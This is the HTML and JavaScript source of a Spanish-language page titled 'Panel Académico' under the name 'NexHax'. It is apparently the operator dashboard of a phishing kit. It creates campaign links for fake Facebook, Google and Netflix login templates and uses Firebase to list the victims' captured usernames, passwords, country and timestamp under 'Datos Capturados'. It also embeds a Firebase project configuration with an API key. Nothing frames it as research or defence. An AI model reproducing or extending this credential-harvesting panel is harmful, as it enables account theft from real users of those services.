<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Acad√©mico</title>
    <style>
        :root {
            --primary: #007aff;
            --bg: #ffffff;
            --text: #1d1d1f;
            --grey: #f5f5f7;
            --border: #e5e5ea;
            --red: #ff3b30;
        }

        body.dark {
            --bg: #000000;
            --text: #ffffff;
            --grey: #1c1c1e;
            --border: #2c2c2e;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, sans-serif;
            transition: background 0.3s, color 0.3s;
        }

        body {
            background: var(--bg);
            color: var(--text);
            padding-top: 60px;
        }

        .top-nav {
            position: fixed;
            top: 0;
            width: 100%;
            height: 60px;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            z-index: 100;
            display: flex;
            align-items: center;
            padding: 0 24px;
            justify-content: space-between;
        }

        body.dark .top-nav {
            background: rgba(0, 0, 0, 0.8);
        }

        .nav-title {
            font-weight: 700;
            font-size: 19px;
        }

        .container {
            padding: 32px 24px;
            max-width: 800px;
            margin: 0 auto;
        }

        .card {
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
        }

        body.dark .card {
            background: #1c1c1e;
        }

        .btn {
            padding: 12px 20px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: 0.1s;
            width: 100%;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-red {
            color: var(--red);
            background: none;
            width: auto;
            font-size: 14px;
        }

        select {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: var(--grey);
            margin-bottom: 12px;
            outline: none;
            color: var(--text);
        }

        .item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
            padding: 12px 0;
        }

        .cred-box {
            background: var(--grey);
            padding: 12px;
            border-radius: 8px;
            margin-top: 8px;
            font-size: 13px;
            border: 1px solid var(--border);
        }

        code {
            background: #e8e8ed;
            padding: 2px 4px;
            border-radius: 4px;
            font-family: monospace;
            color: #1d1d1f;
        }

        #sb {
            position: fixed;
            top: 0;
            left: -280px;
            width: 280px;
            height: 100%;
            background: var(--bg);
            z-index: 201;
            transition: 0.3s;
            padding: 40px 24px;
        }

        .sb-link {
            display: block;
            padding: 16px 0;
            text-decoration: none;
            color: var(--text);
            font-size: 17px;
            font-weight: 500;
            border-bottom: 1px solid var(--border);
        }

        #ov {
            display: none;
            position: fixed;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.2);
            z-index: 200;
            backdrop-filter: blur(4px);
        }
    </style>
    <script>if (localStorage.getItem('theme') === 'dark') document.documentElement.classList.add('dark');</script>
</head>

<body>
    <nav class="top-nav">
        <div class="nav-title">NexHax</div><button onclick="tglM(1)"
            style="background:none; border:none; padding:8px; cursor:pointer; color:var(--text)"><svg width="24"
                height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                stroke-linecap="round" stroke-linejoin="round">
                <line x1="3" y1="12" x2="21" y2="12"></line>
                <line x1="3" y1="6" x2="21" y2="6"></line>
                <line x1="3" y1="18" x2="21" y2="18"></line>
            </svg></button>
    </nav>
    <div id="ov" onclick="tglM(0)"></div>
    <div id="sb">
        <h2 style="margin-bottom:32px">Men√∫</h2><a href="dashboard.html" class="sb-link">Inicio</a><a href="chat.html"
            class="sb-link">Chat Global</a><a href="shortener.html" class="sb-link">Acortador</a><a href="panel.html"
            class="sb-link" style="color:var(--primary); font-weight:700">Panel Acad√©mico</a><a href="profile.html"
            class="sb-link">Perfil</a><button id="logoutBtn"
            style="margin-top:40px; border:none; background:none; color:#ff3b30; font-weight:600; cursor:pointer">Cerrar
            Sesi√≥n</button>
    </div>

    <div class="container">
        <h1 style="font-size: 28px; margin-bottom: 24px;">Campa√±as</h1>
        <div class="card">
            <select id="tpl">
                <option value="facebook">Facebook</option>
                <option value="google">Google</option>
                <option value="netflix">Netflix</option>
            </select>
            <button class="btn btn-primary" onclick="window.gen()">Crear Enlace</button>
        </div>
        <div id="urls"></div>
        <div id="data" style="margin-top: 40px;"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getDatabase, ref, set, onValue, remove } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
        const config = { apiKey: "AIzaSyDp6IB_ZndLgMWamLzThb5EBqClYSQf2LM", authDomain: "lozano-1690859356322.firebaseapp.com", databaseURL: "https://lozano-1690859356322-default-rtdb.firebaseio.com", projectId: "lozano-1690859356322" };
        const app = initializeApp(config);
        const auth = getAuth(app);
        const db = getDatabase(app);
        if (localStorage.getItem('theme') === 'dark') document.body.classList.add('dark');
        let userEmail = "";
        onAuthStateChanged(auth, (user) => { if (!user) window.location.href = "index.html"; else { userEmail = user.email; load(); } });
        window.gen = async () => { const t = document.getElementById('tpl').value; const id = 'c_' + Date.now(); await set(ref(db, `campaigns/${id}`), { template: t, user: userEmail, clicks: 0 }); };
        function load() {
            onValue(ref(db, 'campaigns'), (snap) => {
                const uDiv = document.getElementById('urls'); const dDiv = document.getElementById('data');
                uDiv.innerHTML = ''; dDiv.innerHTML = '<h3 style="margin-bottom:16px">Datos Capturados</h3>';
                const data = snap.val() || {}; let hasD = false;
                Object.keys(data).forEach(id => {
                    const c = data[id]; if (c.user !== userEmail) return;
                    const link = window.location.origin + '/plantillas/plantilla.html?id=' + id;
                    uDiv.innerHTML += `<div class="card"><div class="item"><div><div style="font-weight:600">${c.template.toUpperCase()}</div><div style="font-size:12px;opacity:0.5">${link}</div></div><button class="btn btn-red" onclick="window.del('${id}')">Borrar</button></div></div>`;
                    if (c.credentials) {
                        hasD = true;
                        Object.values(c.credentials).forEach(cr => {
                            dDiv.innerHTML += `<div class="card"><div style="font-weight:600;font-size:14px">${c.template}</div><div class="cred-box">üë§ <code>${cr.username}</code><br>üîê <code>${cr.password}</code><br>üìç ${cr.country || 'N/A'} ‚Ä¢ ${new Date(cr.timestamp).toLocaleString()}</div></div>`;
                        });
                    }
                });
                if (!hasD) dDiv.innerHTML += '<p style="opacity:0.5">No hay datos a√∫n.</p>';
            });
        }
        window.del = (id) => { if (confirm('¬øBorrar?')) remove(ref(db, `campaigns/${id}`)); };
        window.tglM = (s) => { document.getElementById("sb").style.left = s ? "0" : "-280px"; document.getElementById("ov").style.display = s ? "block" : "none"; };
        document.getElementById("logoutBtn").onclick = () => signOut(auth);
    </script>
</body>

</html>
